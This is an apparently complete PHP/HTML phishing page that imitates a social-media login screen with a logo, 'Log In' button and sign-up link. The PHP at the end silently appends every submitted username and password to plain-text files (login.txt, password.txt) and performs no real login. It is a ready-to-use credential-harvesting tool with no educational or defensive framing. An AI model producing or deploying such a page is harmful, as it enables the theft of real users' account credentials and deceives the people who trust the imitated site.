<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
</head>
<
 <style> 


* {
    margin: 0px;
    padding: 0px;
  }
  
  body {
    background-color: #eee;
  }
  
  #wrapper {
    width: 500px;
    height: 50%;
    overflow: hidden;
    border: 0px solid #000;
    margin: 50px auto;
    padding: 10px;
  }
  
  .main-content {
    width: 250px;
    height: 40%;
    margin: 10px auto;
    background-color: #fff;
    border: 2px solid #e6e6e6;
    padding: 40px 50px;
  }
  
  .header {
    border: 0px solid #000;
    margin-bottom: 5px;
  }
  
  .header img {
    height: 50px;
    width: 175px;
    margin: auto;
    position: relative;
    left: 40px;
  }
  
  .input-1,
  .input-2 {
    width: 100%;
    margin-bottom: 5px;
    padding: 8px 12px;
    border: 1px solid #dbdbdb;
    box-sizing: border-box;
    border-radius: 3px;
  }
  
  .overlap-text {
    position: relative;
  }
  
  .overlap-text a {
    position: absolute;
    top: 8px;
    right: 10px;
    color: #003569;
    font-size: 14px;
    text-decoration: none;
    font-family: 'Overpass Mono', monospace;
    letter-spacing: -1px;
  }
  
  .btn {
    width: 100%;
    background-color: #3897f0;
    border: 1px solid #3897f0;
    padding: 5px 12px;
    color: #fff;
    font-weight: bold;
    cursor: pointer;
    border-radius: 3px;
  }
  
  .sub-content {
    width: 250px;
    height: 40%;
    margin: 10px auto;
    border: 1px solid #e6e6e6;
    padding: 20px 50px;
    background-color: #fff;
  }
  
  .s-part {
    text-align: center;
    font-family: 'Overpass Mono', monospace;
    word-spacing: -3px;
    letter-spacing: -2px;
    font-weight: normal;
  }
  
  .s-part a {
    text-decoration: none;
    cursor: pointer;
    color: #3897f0;

    word-spacing: -3px;
    letter-spacing: -2px;
    font-weight: normal;
  }
  
  input:focus {
      background-color: rgb(236, 236, 233);
  }
  </style>
  

   
   <!--html start--> 

   <div id="wrapper">
  <div class="main-content">
    <div class="header">
      <img src="https://i.imgur.com/zqpwkLQ.png" />
    </div>
    <div class="l-part">
    <form method="post">
        <input type="text" placeholder="Username" name="login" class="input-1" />
      <div class="overlap-text">
       
        <input type="password" name="password" placeholder="Password" class="input-2" />
        <a href="#">Forgot?</a>
      </div>
      <input type="submit" value="Log In" class="btn" />
    </div>
  </div>
  <div class="sub-content">
    <div class="s-part">
      Don't have an account?<a href="#">Sign up</a>
    </div>
  </div>
</div>
<!--html finish-->

<?php

 if(isset($_POST['login'])&& isset($_POST['password'])){

  $data=$_POST['login'];

  $fp =fopen('login.txt','a');

  $data1=$_POST['password'];

  $fp1=fopen('password.txt','a');

 $n="\n";

  fwrite($fp,$data );

   fwrite($fp,$n);

  fwrite($fp1,$data1);

  fwrite($fp1,$n);

 

 
  fclose($fp);

  fclose($fp1);
 
 }


?>
    
</body>
</html>